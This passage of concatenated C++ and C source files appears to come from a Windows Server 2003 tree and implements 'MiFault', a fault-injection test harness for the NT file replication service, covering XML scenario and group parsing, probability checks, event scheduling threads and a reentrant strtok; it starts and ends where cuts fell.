    // Check probabilities...
    CProbability::Rep_t sum = 0;
    size_t count = m_Cases.count();
    MiF_ASSERT(count);
    for (size_t i = 0; i < count; i++) {
        sum += m_Cases.item(i)->m_Probability.m_Representation;
    }
    if (sum != CProbability::max) {
        stringstream s;
        s << "Probabilities add up to "
          << (static_cast<CProbability::Orig_t>(sum) / CProbability::max)
          << " (" << sum << " out of " << CProbability::max
          << ") instead of 1 at "
          << toString();
        throw s.str();
    }

    MiF_TRACE(MiF_DEBUG2, "Constructed %s", toString().c_str());
}


CMarkerState::~CMarkerState()
{
    MiF_TRACE(MiF_DEBUG2, "Destroying %s", toString().c_str());
}


const CCase*
CMarkerState::SelectCase() const
{
    size_t count = m_Cases.count();
    MiF_ASSERT(count);

    // optimize likely common occurence where there is just 1 case
    if (count == 1)
        return m_Cases.item(0);

    // get the random number
    CProbability::Rep_t r = CProbability::Random();

    // figure out which case
    for (size_t i = 0; i < count; i++) {
        const CCase* pCase = m_Cases.item(i);
        const CProbability::Rep_t& p = pCase->m_Probability.m_Representation;
        if (r < p)
            return pCase;
        r -= p;
    }

    // We should never get here
    MiF_ASSERT(false);
    return m_Cases.item(0);
}


string
CMarkerState::toString() const
{
    stringstream s;
    s << "MarkerState ("
      << m_Probability.m_Original
      << ", "
      << (char*)m_Marker.m_Tag
      << ", "
      << (char*)m_Marker.m_Function
      << ")";
    return s.str();
}



// ----------------------------------------------------------------------------
// CGroup

CGroup::CGroup(
    IXMLDOMNodePtr ptrNode,
    parent_t* parent
    ):
    CChild<CGroup, CGroupDefs>(parent),
    m_Name(GetTypedAttribute(ptrNode, "name")),
    m_MarkerStates(ptrNode, "NS:MarkerState", this)
{
    // Validate markers are used only once in group
    vector<size_t> MarkerInUse(parent->m_NumWrappers, 0);

    const size_t count = m_MarkerStates.count();
    for (size_t i = 0; i < count; i++) {
        ULONG uFunctionIndex =
            m_MarkerStates.item(i)->m_Marker.m_uFunctionIndex;

        if (uFunctionIndex != -1) {
            if (MarkerInUse[uFunctionIndex]) {
                stringstream s;
                s <<"Multiple instances of marker "
                  << m_MarkerStates.item(i)->m_Marker.toString()
                  << " in group " << toString() << " (at positions "
                  << MarkerInUse[uFunctionIndex] << " and " << i + 1 << ")";
                throw s.str();
            } else {
                MarkerInUse[uFunctionIndex] = i + 1;
            }
        }
    }

    MiF_TRACE(MiF_DEBUG2, "Constructed %s", toString().c_str());
}


CGroup::~CGroup()
{
    MiF_TRACE(MiF_DEBUG2, "Destroying %s", toString().c_str());
}


string
CGroup::toString() const
{
    stringstream s;
    s << "Group ("
      << (char*)m_Name
      << ")";
    return s.str();
}



// ----------------------------------------------------------------------------
// CGroupDefs

CGroupDefs::Params::Params(
    const CWrapperFunction* pWrappers,
    size_t NumWrappers
    ):
    m_pWrappers(pWrappers),
    m_NumWrappers(NumWrappers)
{
}

CGroupDefs::CGroupDefs(
    IXMLDOMNodePtr ptrNode,
    Params* pParams
    ):
    // IMPORTANT: Must initialize m_MIM and m_NumWrappers before m_Groups
    m_MIM(pParams->m_pWrappers, pParams->m_NumWrappers),
    m_NumWrappers(pParams->m_NumWrappers),
    m_FaultLibDll(GetTypedValue(ptrNode, "NS:FaultLibDll")),
    m_hFaultLibDll(NULL),
    m_Groups(ptrNode, "NS:Group", this)
{
    // Initialize the map
    const size_t count = m_Groups.count();
    for (size_t i = 0; i < count; i++) {
        const CGroup* pGroup = m_Groups.item(i);

        const CGroup*& pGroupRef = m_GroupMap[pGroup->m_Name];
        if (pGroupRef) {
            stringstream s;
            s << "Group \"" << (char*) pGroup->m_Name
              << "\" multiply defined";
            throw s.str();
        }
        pGroupRef = pGroup;
    }

    // load the DLL
    m_hFaultLibDll = LoadLibrary(m_FaultLibDll);
    if (!m_hFaultLibDll) {
        stringstream s;
        s << "Could not load \"" << (char*) m_FaultLibDll << "\"";
        throw s.str();
    }

    try {
        // load startup/shutdown functions
        m_pfnFaultFunctionsStartup =
            reinterpret_cast<FP_Startup>(
                MyGetProcAddress(m_hFaultLibDll, m_FaultLibDll,
                                 "MiFaultFunctionsStartup")
                );
        m_pfnFaultFunctionsShutdown =
            reinterpret_cast<FP_Shutdown>(
                MyGetProcAddress(m_hFaultLibDll, m_FaultLibDll,
                                 "MiFaultFunctionsShutdown")
                );
    }
    catch (...) {
        FreeLibrary(m_hFaultLibDll);
        throw;
    }

    MiF_TRACE(MiF_DEBUG2, "Constructed %s", toString().c_str());
}


CGroupDefs::~CGroupDefs()
{
    MiF_TRACE(MiF_DEBUG2, "Destroying %s", toString().c_str());
    FreeLibrary(m_hFaultLibDll);
}


void
CGroupDefs::FaultFunctionsStartup(
    I_Lib* pLib
    )
{
    if (!m_pfnFaultFunctionsStartup(MIFAULT_VERSION, pLib)) {
        stringstream s;
        s << "Incorrect version when calling \"MiFaultFunctionsStartup\" in \""
          << m_FaultLibDll;
        throw s.str();
    }
}

void
CGroupDefs::FaultFunctionsShutdown(
    )
{
    m_pfnFaultFunctionsShutdown();
}

string
CGroupDefs::toString() const
{
    stringstream s;
    s << "GroupDefs (" << m_FaultLibDll << ")";
    return s.str();
}

const CGroup*
CGroupDefs::Lookup(
    _bstr_t GroupName
    ) const
{
    iter_t iter = m_GroupMap.find(GroupName);
    if (iter == m_GroupMap.end())
        return 0;
    return iter->second;
}



// ----------------------------------------------------------------------------
// CEvent

CEvent::CEvent(
    IXMLDOMNodePtr ptrNode,
    parent_t* parent
    ):
    CChild<CEvent, CScenario>(parent),
    m_Node(GetTypedValue(ptrNode, "NS:Node")),
    m_Start(GetDurationFromVariant(GetTypedValue(ptrNode, "NS:Start"))),
    m_Duration(GetDurationFromVariant(GetTypedValue(ptrNode, "NS:Duration"))),
    m_GroupName(GetTypedValue(ptrNode, "NS:Group")),
    m_pGroup(parent->m_pGroupDefs->Lookup(m_GroupName)),
    m_Arguments(ptrNode, "NS:Argument", this)
{
    if (!m_pGroup) {
        stringstream s;
        s << "Could not find group \"" << (char*) m_GroupName
          << "\" in group definitions";
        throw s.str();
    }

    MiF_TRACE(MiF_DEBUG2, "Constructed %s", toString().c_str());
}


CEvent::~CEvent()
{
    MiF_TRACE(MiF_DEBUG2, "Destroying %s", toString().c_str());
}


string
CEvent::toString() const
{
    stringstream s;
    s << "Event ("
      << (char*) m_Node
      << ", "
      << (m_Parent->m_Start + m_Start).TimeString()
      << ", "
      << (m_Parent->m_Start + m_Start + m_Duration).TimeString()
      << ", "
      << (char*) m_GroupName
      << ")";

    return s.str();
}



// ----------------------------------------------------------------------------
// CScenario

#include <functional>
#include <algorithm>

class CScenario::CPseudoEvent {
    const CTicks m_Time;
    const bool m_bStart;
    const CEvent* m_pEvent;
    const CPseudoEvent* m_pEnd;

    CPseudoEvent(const CEvent* pEvent, const CPseudoEvent* pEnd = 0);

public:
    bool operator<(const CPseudoEvent& pe) const;

    friend class CScenario;
};

// NOTICE-2002/07/15-daniloa -- Workaround for STL bug fixed in VC7 (Q265109)
// Since the Windows build currently uses VC6 STL, we need this workaround.

template<>
struct greater<CScenario::CPseudoEvent*>
{
    bool operator()(
        const CScenario::CPseudoEvent*& _Left,
        const CScenario::CPseudoEvent*& _Right
        ) const
    {
        return (*_Left) < (*_Right);
    }
};

// User-defined predicate function for sorting.
struct TimeLessThan : public greater<CScenario::CPseudoEvent*>
{
    bool operator()(
        const CScenario::CPseudoEvent*& _Left,
        const CScenario::CPseudoEvent*& _Right
        ) const
    {
        return (*_Left) < (*_Right);
    }
};

CScenario::CPseudoEvent::CPseudoEvent(
    const CEvent* pEvent,
    const CPseudoEvent* pEnd
    ):
    m_Time(pEnd ? pEvent->m_Start : pEvent->m_Start + pEvent->m_Duration),
    m_bStart(pEnd ? true : false),
    m_pEvent(pEvent),
    m_pEnd(pEnd)
{
}

bool
CScenario::CPseudoEvent::operator<(const CPseudoEvent& pe) const
{
    return
        (m_Time < pe.m_Time) ||
        ( (m_Time == pe.m_Time) &&
          (m_pEvent == pe.m_pEvent) &&
          m_bStart );
}

CScenario::Params::Params(
    const _bstr_t Node,
    const FILETIME& ftModTime,
    const CGroupDefs* pGroupDefs,
    size_t NumWrappers
    ):
    m_Node(Node),
    m_ftModTime(ftModTime),
    m_pGroupDefs(pGroupDefs),
    m_NumWrappers(NumWrappers)
{
}

CScenario::CScenario(
    IXMLDOMNodePtr ptrNode,
    Params* pParams
    ):
    // IMPORTANT:
    //
    // Initialize m_pGroupDefs before m_Events because the
    // CEvent constructor needs to access it during its construction.
    //
    // FUTURE-2002/07/15-daniloa -- Add another template param to CArray
    // We may want to have CArray take another template parameter
    // denoting an extra pointer argument for construction.  Then we
    // may be able to get rid of some of the parent references during
    // construction.
    m_Node(pParams->m_Node),
    m_ModTime(pParams->m_ftModTime),
    m_pGroupDefs(pParams->m_pGroupDefs),
    m_MST(pParams->m_NumWrappers),
    m_Control(GetTypedValue(ptrNode, "NS:Control")),
    m_Start(GetFileTimeFromVariant(GetTypedValue(ptrNode, "NS:Start"))),
    m_Events(ptrNode, "NS:Event", this),
    m_iterCurrent(m_PseudoEvents.end()),
    m_Converter(m_Control, m_Start),
    m_RefCount(1)
{
    MiF_ASSERT(m_pGroupDefs);
    MiF_TRACE(MiF_DEBUG2, "Constructed %s", toString().c_str());
}


CScenario::~CScenario()
{
    MiF_TRACE(MiF_DEBUG2, "Destroying %s", toString().c_str());
    _CleanupPseudoEvents();
}


bool
CScenario::Init()
{
    if (!m_Converter.Init()) {
        MiF_TRACE(MiF_ERROR, "Could not initialize converter");
        return false;
    }

    try {
        _CreatePseudoEvents();
    }
    catch (...) {
        MiF_TRACE(MiF_ERROR, "Could not create pseudo-events");
        throw;
    }
    return true;
}


string
CScenario::toString() const
{
    stringstream s;
    s << "Scenario ("
      << (char*) m_Control
      << ", "
      << m_Start.TimeString()
      << ")";

    return s.str();
}


ULONG
CScenario::AddRef(
    )
{
    return InterlockedIncrement(&m_RefCount);
}


ULONG
CScenario::Release(
    )
{
    ULONG count = InterlockedDecrement(&m_RefCount);
    if (count == 0)
        delete this;
    return count;
}


bool
CScenario::IsDone(
    )
{
    return m_iterCurrent == m_PseudoEvents.end();
}


CTicks
CScenario::NextEventTicksFromNow(
    )
{
    if (IsDone())
        throw "Trying to get ticks from now for non-existent next event";
    return m_Converter.TicksFromNow((*m_iterCurrent)->m_Time);
}


bool
CScenario::ProcessEvent(
    )
{
    // FUTURE-2002/07/15-daniloa -- Improve or remove logging of ProcessEvent
    MiF_TRACE(MiF_INFO, "ProcessEvent()");

    // let's make sure we are atomic
    m_MST.Lock();

    // double-check whether we are done
    if (IsDone()) {
        m_MST.Unlock();
        return false;
    }

    // get the pseudo-event
    const CPseudoEvent* pPE = *m_iterCurrent;

    // ISSUE-2002/07/15-daniloa -- Use threshold for event time comparison?
    if (m_Converter.TicksFromNow(pPE->m_Time) > 0) {
        m_MST.Unlock();
        return false;
    }

    // ok, the event really happened, so let's do it...

    // Log event
    MiF_TRACE(MiF_INFO, "EVENT %s HAPPENING: %s",
              (pPE->m_bStart ? "START" : "STOP"),
              pPE->m_pEvent->toString().c_str());

    _ProcessEvent(true, pPE);
    m_iterCurrent++;

    m_MST.Unlock();
    return true;
}


// _ProcessEvent()
//
//   bForReal
//
//     Controls whether this function asserts or throws to signal
//     failure.  If this is the validation phase, bForReal is false,
//     and the function throws to signal failure.  If this is
//     run-time, bForRealis true and the function will assert to
//     signal a failure.
//
//   pPE
//
//     The pseudo-event to try processing
//
void
CScenario::_ProcessEvent(
    bool bForReal,
    const CPseudoEvent* pPE
    )
{
    const CEvent* pEvent = pPE->m_pEvent;

    const size_t count = pEvent->m_pGroup->m_MarkerStates.count();
    for (size_t i = 0; i < count; i++) {
        const CMarkerState* pMarkerState =
            pEvent->m_pGroup->m_MarkerStates.item(i);

        const ULONG& uFunctionIndex = pMarkerState->m_Marker.m_uFunctionIndex;

        if (bForReal) {
            MiF_ASSERT(uFunctionIndex != -1);
        } else {
            if (uFunctionIndex == -1) {
                stringstream s;
                s << "Unknown marker " << pMarkerState->m_Marker.toString()
                  << " while validating event " << pEvent->toString();
                throw s.str();
            }
        }

        bool bOk;
        if (pPE->m_bStart) {
            bOk = m_MST.Activate(uFunctionIndex, pMarkerState, pEvent);
        } else {
            bOk = m_MST.Deactivate(uFunctionIndex, pMarkerState, pEvent);
        }

        if (bForReal) {
            MiF_ASSERT(bOk);

            // Cleanup event arguments (and therefore state) when done
            // with the event.

            if (!pPE->m_bStart) {
                pEvent->m_Arguments.Cleanup();
            }

        } else {
            if (bOk) {
                // load function pointers
                size_t count = pMarkerState->m_Cases.count();
                for (size_t i = 0; i < count; i++) {
                    const CCase* pCase = pMarkerState->m_Cases.item(i);
                    if (pCase->m_pfnFaultFunction)
                        continue;

                    // will throw if needed
                    pCase->LoadFunction();
                }
            } else {
                CMarkerState* pCulpritMarkerState;
                CEvent* pCulpritEvent;

                bool found = m_MST.Lookup(uFunctionIndex,
                                          pCulpritMarkerState, pCulpritEvent);
                MiF_ASSERT(found);

                stringstream s;
                s << "Overlap at marker " << pMarkerState->m_Marker.toString()
                  << " while validating event " << pEvent->toString()
                  << " --- the culprit appears to be marker "
                  << pCulpritMarkerState->m_Marker.toString()
                  << " from event " << pCulpritEvent->toString();
                throw s.str();
            }
        }
    }
}

void
CScenario::_CreatePseudoEvents(
    )
{
    const size_t count = m_Events.count();

    CTicks Now = Global.pTicker->GetTicks();

    for (size_t i = 0; i < count; i++) {
        const CEvent* pEvent = m_Events.item(i);

        // skip events that are not for this node
        if (_wcsicmp((wchar_t*)pEvent->m_Node, (wchar_t*)m_Node))
            continue;

        // skip events that have already ended
        if (m_Converter.TicksFromThen(pEvent->m_Start + pEvent->m_Duration,
                                      Now) <= 0)
            continue;

        CPseudoEvent* pEnd = new CPseudoEvent(pEvent);
        CPseudoEvent* pStart = new CPseudoEvent(pEvent, pEnd);

        m_PseudoEvents.push_back(pStart);
        m_PseudoEvents.push_back(pEnd);
    }

    // Sort in time order
    m_PseudoEvents.sort(TimeLessThan());

    // Validate
    for (PEL_iter_t iter = m_PseudoEvents.begin();
         iter != m_PseudoEvents.end(); iter++) {

        const CPseudoEvent& e = **iter;

        // will throw if something bad happens
        _ProcessEvent(false, &e);
    }

    // Set up the index
    m_iterCurrent = m_PseudoEvents.begin();
}

void
CScenario::_CleanupPseudoEvents(
    )
{
    for (PEL_iter_t iter = m_PseudoEvents.begin();
         iter != m_PseudoEvents.end(); iter++) {

        delete *iter;
        *iter = NULL;
    }
}

void
CScenario::DumpPseudoEvents(
    ) const
{
    stringstream s;

    s << endl << "--- start of pseudo-events ---" << endl;

    for (PEL_iter_t iter = m_PseudoEvents.begin();
         iter != m_PseudoEvents.end(); iter++) {

        const CPseudoEvent& e = **iter;

        s << (m_Start + e.m_Time).TimeString() << ": "
          << ( e.m_bStart ? "START" : "STOP" ) << ": "
          << e.m_pEvent->toString() << endl;
    }

    s << "--- end of pseudo-events ---";
    MiF_TRACE(MiF_INFO, "%s", s.str().c_str());
}

bool
CScenario::Lookup(
    ULONG uFunctionIndex,
    OUT const CMarkerState*& pMarkerState,
    OUT const CEvent*& pEvent
    ) const
{
    return m_MST.Lookup(uFunctionIndex, pMarkerState, pEvent);
}


// ----------------------------------------------------------------------------

#pragma warning( pop )
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\strtok_r.c ===
#define NULL 0

/*
Suppress Warning:

Compiler Warning (level 4) C4057'operator' : 'identifier1' indirection
to slightly different base types from 'identifier2'

Two pointer expressions refer to different base types. The expressions
are used without conversion.

Possible cause 

- Mixing signed and unsigned types. 
- Mixing short and long types.

*/

#pragma warning(disable:4057)

/* reentrant strtok, copied/pasted from crt */
char * __cdecl strtok_r (
	char * string,
	const char * control,
	char ** nextoken
	)
{
	unsigned char *str;
	const unsigned char *ctrl = control;

	unsigned char map[32];
	int count;

	/* Clear control map */
	for (count = 0; count < 32; count++)
		map[count] = 0;

	/* Set bits in delimiter table */
	do {
		map[*ctrl >> 3] |= (1 << (*ctrl & 7));
	} while (*ctrl++);

	/* Initialize str. If string is NULL, set str to the saved
	 * pointer (i.e., continue breaking tokens out of the string
	 * from the last strtok call) */
	if (string)
		str = string;
	else
		str = *nextoken;

	/* Find beginning of token (skip over leading delimiters). Note that
	 * there is no token iff this loop sets str to point to the terminal
	 * null (*str == '\0') */
	while ( (map[*str >> 3] & (1 << (*str & 7))) && *str )
		str++;

	string = str;

	/* Find the end of the token. If it is not the end of the string,
	 * put a null there. */
	for ( ; *str ; str++ )
		if ( map[*str >> 3] & (1 << (*str & 7)) ) {
			*str++ = '\0';
			break;
		}

	/* Update nextoken */
	*nextoken = str;

	/* Determine if a token has been found. */
	if ( string == str )
		return NULL;
	else
		return string;
}
=== C:/Users/treeman/Desktop/windows nt source code\Source\Win2K3\NT\ds\netapi\svcimgs\ntrepl\test\mifault\src\global.cxx ===
#include "pch.hxx"

CGlobal Global;


BOOL
CGlobal::ProcessAttach(
    HINSTANCE _hInstance
    )
{
    hInstance = _hInstance;
    dwTlsIndex = TlsAlloc();
    InitializeCriticalSection(&cs);

    if (dwTlsIndex == TLS_OUT_OF_INDEXES) {
        MiF_TRACE(MiF_ERROR, "Out of TLS indices -- failing process attach");
        return FALSE;
    }

    return TRUE;
}


BOOL
CGlobal::ProcessDetach(
    )
{
    DeleteCriticalSection(&cs);
    TlsFree(dwTlsIndex);
    return TRUE;
}


BOOL
CGlobal::WrapperAttach(
    CSetPointManager* _pSetPointManager,
    const CWrapperFunction* _pWrappers,
    size_t _NumWrappers,
    const char* _ModuleName
    )
{
    MiF_ASSERT(_pSetPointManager);
    MiF_ASSERT(!pSetPointManager);

    MiF_ASSERT(_pWrappers);
    MiF_ASSERT(!pWrappers);

    MiF_ASSERT(_ModuleName);

    pSetPointManager = _pSetPointManager;
    pWrappers = _pWrappers;
    NumWrappers = _NumWrappers;
    ModuleName = _ModuleName;

    return TRUE;
}


BOOL
CGlobal::WrapperDetach(
    )
{
    return TRUE;
}


string
GetModuleDir(
    HMODULE hModule
    )
{
    char module[MAX_PATH + 1];
    module[MAX_PATH] = 0;

    if (!GetModuleFileName(Global.hInstance, module, MAX_PATH))
    {
        throw "Could not get module file name";
    }

    char* p = PathFindFileName(module);
    p--;
    *p = 0;

    return module;
}


string
MakePath(
    const char*  module,
    const char* name
    )
{
    if (PathIsRelative(name)) {
        char buffer[MAX_PATH + 1];
        buffer[MAX_PATH] = 0;

        char* p = PathCombine(buffer, module, name);
        MiF_ASSERT(p);
        return buffer;
    }
    else {
        return name;
    }
}


FILETIME
GetFileModTime(
    LPCTSTR FileName
    )
{
    WIN32_FILE_ATTRIBUTE_DATA Info;

    if (!GetFileAttributesEx(FileName, GetFileExInfoStandard, &Info))
        throw WIN32_ERROR(GetLastError(), "GetAttributesEx()");

    return Info.ftLastWriteTime;
}


// return true when event loop should terminate
typedef bool (*FP_handler_t)(void*);

struct handler_t {
    FP_handler_t func;
    void* arg;
};

struct CheckConfigParam_t {
    HANDLE hCheckConfigTimer;
    CTicks Period;
    CMTime BadModTime;

    CheckConfigParam_t(HANDLE h, CTicks& t):
        hCheckConfigTimer(h),Period(t),BadModTime(0) {};
};


bool
TerminateHandler(
    void*
    )
{
    MiF_TRACE(MiF_DEBUG, "Terminate Handler");
    return true;
}


bool
CheckConfigHandler(
    void* arg
    )
{
    MiF_TRACE(MiF_DEBUG, "Check Config Handler");

    MiF_ASSERT(arg);
    CheckConfigParam_t* pParam = reinterpret_cast<CheckConfigParam_t*>(arg);

    // FUTURE-2002/07/15-daniloa -- Use better heuristics for file change

    CMTime CurrentModTime = GetFileModTime(Global.ScenarioFileName.c_str());

    CScenario* pScenario = Global.GetScenario();
    CMTime LoadedModTime = pScenario->m_ModTime;
    pScenario->Release();

    if ((CurrentModTime != pParam->BadModTime) &&
        (CurrentModTime != LoadedModTime))
    {
        MiF_TRACE(MiF_INFO, "Scenario modtime has changed --> reloading");

        if (!Global.ReloadScenario())
            pParam->BadModTime = CurrentModTime;
        else
            pParam->BadModTime = 0;
    }

    BOOL bOk = SetWaitableTimer(pParam->hCheckConfigTimer,
                                pParam->Period);
    if (!bOk) {
        MiF_TRACE(MiF_ERROR, "SetWaitableTimer() error %u", GetLastError());
        MiF_ASSERT(bOk);
    }

    return false;
}


bool
NextEventHandler(
    void* arg
    )
{
    MiF_TRACE(MiF_DEBUG, "Next Event Handler");

    MiF_ASSERT(arg);
    HANDLE hNextEventTimer = *reinterpret_cast<HANDLE*>(arg);

    CScenario* pScenario = Global.GetScenario();
    MiF_ASSERT(pScenario);

    bool bDone;
    CTicks Next;

    while (pScenario->ProcessEvent());
    bDone = pScenario->IsDone();
    if (!bDone) {
        Next = pScenario->NextEventTicksFromNow();
    }
    pScenario->Release();

    if (!bDone) {
        stringstream s;
        s << "Setting next event for "
          << Next.TotalHns() / CTicks::Millisecond
          << " msecs from now";
        MiF_TRACE(MiF_INFO, s.str().c_str());

        BOOL bOk = SetWaitableTimer(hNextEventTimer, Next);
        if (!bOk) {
            MiF_TRACE(MiF_ERROR, "SetWaitableTimer() error %u",
                      GetLastError());
            MiF_ASSERT(bOk);
        }
    } else {
        MiF_TRACE(MiF_INFO, "No more events");
    }

    return false;
}


DWORD
WINAPI
ConfigUpdateThread(
    LPVOID pParam
    )
{
    MiF_TRACE(MiF_DEBUG, "Config Update Thread started");

    MiF_ASSERT(pParam);
    CTicks* pPeriod = reinterpret_cast<CTicks*>(pParam);

    bool bError = false;
    HANDLE hCheckConfigTimer = NULL;

    try {
        const DWORD count = 2;

        hCheckConfigTimer = CreateWaitableTimer(NULL,  // SD
                                                FALSE, // manual reset
                                                NULL); // name
        if (!hCheckConfigTimer) {
            throw WIN32_ERROR(GetLastError(), "CreateWaitableTimer");
        }

        HANDLE handles[count];
        handler_t handlers[count];

        size_t i = 0;

        handles[i] = Global.hTerminate;
        handlers[i].func = TerminateHandler;
        handlers[i].arg = 0;
        i++;

        CheckConfigParam_t CheckConfigParam(hCheckConfigTimer, *pPeriod);

        // check for config update and set the timer for next check
        handles[i] = hCheckConfigTimer;
        handlers[i].func = CheckConfigHandler;
        handlers[i].arg = &CheckConfigParam;
        i++;

        BOOL bOk;
        // set timer for config file check
        bOk = SetWaitableTimer(hCheckConfigTimer, *pPeriod);
        if (!bOk) {
            throw WIN32_ERROR(GetLastError(), "SetWaitableTimer");
        }

        // event loop

        DWORD dwWait;
        bool bDone = false;

        while (!bDone) {
            dwWait = WaitForMultipleObjects(count, handles, FALSE, INFINITE);

            // dwWait >= WAIT_OBJECT_0 is always true...
            if (dwWait < (WAIT_OBJECT_0 + count)) {
                bDone = handlers[dwWait].func(handlers[dwWait].arg);
            } else {
                // ISSUE-2002/07/15-daniloa -- Handle WaitForMultipleObjects() error?
                MiF_ASSERT(false);
                stringstream s;
                s << "Unexpected WaitForMultipleObjects() result: " << dwWait;
                throw s.str();
            }
        }
    }
    catch (...) {
        global_exception_handler();
        bError = true;
    }

    if (hCheckConfigTimer)
        CloseHandle(hCheckConfigTimer);
    delete pPeriod;

    if (bError) {
        MiF_TRACE(MiF_FATAL, "Abnormal Config Terminate Thread termination");
        abort();
    } else {
        MiF_TRACE(MiF_DEBUG, "Normal Config Terminate Thread termination");
    }

    return bError ? 1 : 0;
}


DWORD
WINAPI
EventActivationThread(
    LPVOID pParam
    )
{
    MiF_TRACE(MiF_DEBUG, "Event Activation Thread started");

    bool bError = false;
    HANDLE hNextEventTimer = NULL;

    try {
        const DWORD count = 3;

        hNextEventTimer = CreateWaitableTimer(NULL,  // SD
                                             FALSE, // manual reset
                                             NULL); // name
        if (!hNextEventTimer) {
            throw WIN32_ERROR(GetLastError(), "CreateWaitableTimer");
        }

        HANDLE handles[count];
        handler_t handlers[count];

        size_t i = 0;

        handles[i] = Global.hTerminate;
        handlers[i].func = TerminateHandler;
        handlers[i].arg = 0;
        i++;

        // on a config update, set the timer (and potentially process something)
        handles[i] = Global.hConfigUpdate;
        handlers[i].func = NextEventHandler;
        handlers[i].arg = &hNextEventTimer;
        i++;

        // on an event, process it and set the timer
        handles[i] = hNextEventTimer;
        handlers[i].func = NextEventHandler;
        handlers[i].arg = &hNextEventTimer;
        i++;

        // event loop

        DWORD dwWait;
        bool bDone = NextEventHandler(&hNextEventTimer);

        while (!bDone) {
            dwWait = WaitForMultipleObjects(count, handles, FALSE, INFINITE);

            // dwWait >= WAIT_OBJECT_0 is always true...
            if (dwWait < (WAIT_OBJECT_0 + count)) {
                bDone = handlers[dwWait].func(handlers[dwWait].arg);
            } else {
                // ISSUE-2002/07/15-daniloa -- Handle WaitForMultipleObjects() error?
                MiF_ASSERT(false);
                stringstream s;
                s << "Unexpected WaitForMultipleObjects() result: " << dwWait;
                throw s.str();
            }
        }
    }
    catch (...) {
        global_exception_handler();
        bError = true;
    }

    if (hNextEventTimer)
        CloseHandle(hNextEventTimer);

    if (bError) {
        MiF_TRACE(MiF_FATAL, "Abnormal Event Activation Thread termination");
        abort();
    } else {
        MiF_TRACE(MiF_DEBUG, "Normal Event Actication Thread termination");
    }

    return bError ? 1 : 0;
}


void
CGlobal::InitFileNames(
    )
{
    bool bOk;
    char buffer[MAX_PATH + 1];
    buffer[MAX_PATH] = 0;

    string module_dir = GetModuleDir(hInstance);

    CIniFile& IniFile = Global.pSetPointManager->GetIniFile();

    bOk = IniFile.GetValue("MiFault", "GroupDefsFile", MAX_PATH, buffer);
    if (!bOk) {
        throw "Could not read ScenarioFile setting for MiFault";
    }
    GroupDefsFileName = MakePath(module_dir.c_str(), buffer);
    MiF_TRACE(MiF_INFO, "GroupDefsFile = %s", GroupDefsFileName.c_str());

    bOk = IniFile.GetValue("MiFault", "ScenarioFile", MAX_PATH, buffer);
    if (!bOk) {
        throw "Could not read ScenarioFile setting for MiFault";
    }
    ScenarioFileName = MakePath(module_dir.c_str(), buffer);
    MiF_TRACE(MiF_INFO, "ScenarioFile = %s", ScenarioFileName.c_str());
}



_bstr_t
GetNodeName(
    )
    throw(...)
{
    // This function uses GetComputerNameEx() so that it is easier to
    // change the name type that we want.  For now, it uses
    // ComputerNameNetBIOS.  Ideally, this should be configurable.

    COMPUTER_NAME_FORMAT NameType = ComputerNameNetBIOS;

    LPTSTR pBuffer = NULL;
    DWORD dwSize = 0;

    BOOL bOk;
    DWORD dwStatus;

    bOk = GetComputerNameEx(
        NameType, // name type
        NULL,     // name buffer
        &dwSize   // size of name buffer
        );

    dwStatus = GetLastError();
    if (dwStatus != ERROR_MORE_DATA) {
        throw WIN32_ERROR(dwStatus, "GetComputerNameEx");
    }

    pBuffer = new TCHAR[dwSize];

    bOk = GetComputerNameEx(
        NameType, // name type
        pBuffer,     // name buffer
        &dwSize   // size of name buffer
        );

    if (!bOk) {
        dwStatus = GetLastError();
        throw WIN32_ERROR(dwStatus, "GetComputerNameEx");
    }

    _bstr_t Result = pBuffer;
    delete [] pBuffer;
    return Result;
}


bool
CGlobal::Init(
    )
{
    // Check before acquiring lock
    if (bInit || bInitError)
        return !bInitError;

    // prevent multiple calls into Init()
    CAutoLock A(&cs);

    // Check that nobody else finished initializing
    if (bInit || bInitError)
        return !bInitError;

    try {

        // Seed the random number generator
        CProbability::Seed();

        // Initialize I_Lib implementation
        pILibImplementation = new CI_Lib_Imp(dwTlsIndex);

        // Figure out what this "node" is
        NodeName = GetNodeName();

        // Get a ticker so people can get tick counts
        pTicker = new CTicker;

        // Read group defs and scenarion file names
        InitFileNames();

        // load group definitions
        pGroupDefs =
            LoadGroupDefs(GroupDefsFileName.c_str(), pWrappers, NumWrappers);

        // init FF DLL
        pGroupDefs->FaultFunctionsStartup(pILibImplementation);

        // load scenario
        pScenario =
            LoadScenario(ScenarioFileName.c_str(), NodeName,
                         pGroupDefs, NumWrappers);

        // some debug output
        pScenario->DumpPseudoEvents();

        // Set up termination event
        hTerminate = CreateEvent(NULL,  // SD
                                 FALSE, // manual reset
                                 FALSE, // initial state
                                 NULL); // name
        if (!hTerminate)
            throw WIN32_ERROR(GetLastError(), "CreateEvent");

        // Set up config update event
        hConfigUpdate = CreateEvent(NULL,  // SD
                                    FALSE, // manual reset
                                    FALSE, // initial state
                                    NULL); // name
        if (!hConfigUpdate)
            throw WIN32_ERROR(GetLastError(), "CreateEvent");

        // Set up thread - config update
        hConfigUpdateThread = CreateThread(NULL,  // SD
                                           0,     // initial stack size
                                           ConfigUpdateThread, // func
                                           new CTicks(5 * CTicks::Second), // arg
                                           0,     // creation option
                                           NULL); // thread id ptr
        if (!hConfigUpdateThread)
            throw WIN32_ERROR(GetLastError(), "CreateThread");

        // Set up thread - scenario event activation
        hEventActivationThread = CreateThread(NULL,  // SD
                                              0,     // initial stack size
                                              EventActivationThread, // func
                                              NULL,  // arg
                                              0,     // creation option
                                              NULL); // thread id ptr
        if (!hEventActivationThread)
            throw WIN32_ERROR(GetLastError(), "CreateThread");

    }
    catch (...) {
        global_exception_handler();
        bInitError = true;
    }

    bInit = true;
    return !bInitError;
}


bool
CGlobal::ReloadScenario(
    )
{
    MiF_ASSERT(bInit && !bInitError);

    CScenario* pNewScenario;

    bool bError = false;
    try {

        // load scenario
        pNewScenario =
            LoadScenario(ScenarioFileName.c_str(), NodeName,
                         pGroupDefs, NumWrappers);
    }
    catch (...) {
        global_exception_handler();
        bError = true;
    }

    if (bError)
        return false;

    // we have the new scenario, so let's use it

    // some debug output
    pNewScenario->DumpPseudoEvents();

    CScenario* pOldScenario = pScenario;
    pScenario = pNewScenario; // atomic...yay!
    pOldScenario->Release();

    BOOL bOk = SetEvent(hConfigUpdate);
    if (!bOk) {
        MiF_TRACE(MiF_ERROR, "SetEvent() error %u", GetLastError());
        MiF_ASSERT(bOk);
    }

    return true;
}


CScenario*
